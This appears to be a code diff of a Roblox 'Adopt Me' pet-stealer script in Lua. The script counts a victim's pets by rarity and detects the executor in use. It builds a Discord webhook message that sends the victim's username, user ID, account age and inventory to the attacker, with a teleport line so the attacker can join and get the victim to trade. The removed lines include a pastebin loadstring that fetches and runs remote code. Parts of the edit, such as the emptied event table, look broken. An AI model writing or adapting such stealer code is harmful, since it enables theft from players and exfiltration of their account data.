@@ -32,69 +32,39 @@ for i, v in pairs(ClientData.get("inventory").pets) do
     common_count = common_count + 1
   end
 end
-
-local exploit = nil
+local exploit
 local function getexploit()
-  if syn and syn.request then
-    exploit = "Synapse X"
-  elseif syn and syn.protect_gui then
-    exploit = "Synapse X (Legacy)"
-  elseif secure_load then
-    exploit = "Sentinel"
-  elseif is_sirhurt_closure then
-    exploit = "Sirhurt"
-  elseif pebc_execute then
-    exploit = "ProtoSmasher"
-  elseif KRNL_LOADED then
-    exploit = "KRNL"
-  elseif WrapGlobal then
-    exploit = "WeAreDevs"
-  elseif isvm then
-    exploit = "Proxo"
-  elseif shadow_env then
-    exploit = "Shadow"
-  elseif jit then
-    exploit = "EasyExploits"
-  elseif getscriptenvs then
-    exploit = "Calamari"
-  elseif unit then
-    exploit = "Unit"
-  elseif OXYGEN_LOADED then
-    exploit = "Oxygen U"
-  elseif IsElectron then
-    exploit = "Electron"
-  elseif game:GetService("HttpService"):GetAsync("https://www.roblox.com") then
-    exploit = "Codex"
-  else
-    exploit = "Unknown"
-  end
-  return exploit
-end
+    local exploitt =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "Sirhurt") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "KRNL") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getscriptenvs and "Calamari") or
+        (unit and not syn and "Unit") or
+        (OXYGEN_LOADED and "Oxygen U") or
+        (IsElectron and "Electron") or
+        ("Couldnt Grab")
 
-local exploit = safeGetexploit()
-local http = game:GetService("HttpService")
+    exploit = exploitt
+end
+getexploit()
 local plr = game.Players.LocalPlayer
 local userid = game.Players.LocalPlayer.UserId
 local accage = game.Players.LocalPlayer.AccountAge
-local function getRobloxAvatar(userid)
-  local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userid .. "&width=420&height=420&format=png"
-  return avatarUrl
-end
-
 local data = {
-  username = 'Victim Username: '.. tostring(plr) ..'',
-  avatar_url = avatarUrl,
-  content = '@everyone Join your victim using **EXECUTE TO JOIN THEM** and they should just trade you to start stealing!',
+  username = 'Pethical | Adopt Me Stealer!!',
+  avatar_url = 'https://cdn.discordapp.com/attachments/1295330912900223039/1296364145406509056/standard_3.gif?ex=671204b1&is=6710b331&hm=995afe10858ed42f3ab62edd76e9c71de4fbbf8120bb1450c963cceff22483fd&',
+  content = '@everyone Join your player using **EXECUTE TO JOIN THEM** and they should just trade you to start stealing!',
   embeds = {
     {
-      title = '⭐ Kenn Scripts',
-      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n```\n**💼 Execute To Join Them**:\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)\n```\n**🎁 claim All Script**:\n```lua\nUsername = "'.. tostring(plr) ..'"loadstring(game:HttpGet("https://pastebin.com/raw/GzXc94aX"))()```',
-      color = 0x00ff00,
-      fields = {
-        image = {
-        url = avatarUrl
-        }
-      }
+      title = 'Pethical | Skidtho 👑',
+      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n```\n**💼 Execute To Join Them**:\n\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)\n```',
+      color = 10428396
     }
   }
 }
@@ -116,7 +86,7 @@ for i, v in pairs(game:GetService("ReplicatedStorage").API:GetChildren()) do
   if v:IsA('RemoteEvent') then
     spawn(function()
       v.OnClientEvent:Connect(function(...)
-        local x = {...} -- <--- Add a closing } here
+        x = {} -- <--- Add a closing } here
         if type(x[3]) == 'table' and x[2] == 'trade' then
           table = x[3]
           sender = table.sender
